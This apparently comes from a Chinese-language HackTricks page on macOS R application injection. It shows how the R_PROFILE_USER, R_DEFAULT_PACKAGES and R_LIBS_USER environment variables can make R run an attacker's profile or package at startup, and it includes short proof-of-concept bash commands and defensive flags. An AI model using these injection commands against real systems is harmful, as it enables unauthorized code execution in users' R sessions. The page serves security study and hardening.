# macOS R 应用程序注入

{{#include ../../../banners/hacktricks-training.md}}

## `R_PROFILE_USER` / `R_PROFILE`

启动时，R 会加载包含 R 代码的站点配置文件和用户配置文件。`R_PROFILE` 用于选择站点配置文件，`R_PROFILE_USER` 用于选择用户配置文件，因此攻击者可以通过继承的环境将任一查找重定向到攻击者可读取的文件。<sup>[[1]](#references)</sup>
```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```
`--no-init-file` 跳过用户 profile，`--no-site-file` 跳过 site profile，而 `--vanilla` 同时启用这两项保护。R 首先处理由 `R_ENVIRON` 和 `R_ENVIRON_USER` 选择的环境文件，但这些文件只能设置变量；profile 变量才是直接执行任意代码的原语。

## `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` 和 library 路径

R 在启动期间挂载 `R_DEFAULT_PACKAGES` 中以逗号分隔的软件包。`Rscript` 会优先使用 `R_SCRIPT_DEFAULT_PACKAGES`。将任一变量与 `R_LIBS`、`R_LIBS_USER` 或 `R_LIBS_SITE` 结合使用，可能使 R 查找并加载攻击者控制的已安装软件包；其 `.onLoad` 或 `.onAttach` hook 会自动执行。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```
这需要一个结构有效的已安装 R package，而不仅仅是一个松散的 `.R` 文件。`--vanilla` 不会清除直接继承的变量，因此受信任的 wrapper 必须取消设置或替换默认 package 和 library-path 变量，同时禁用 profile 文件。

## References

- [1] [R 会话启动时的初始化](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [2] [R 安装与管理：附加 package](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
{{#include ../../../banners/hacktricks-training.md}}
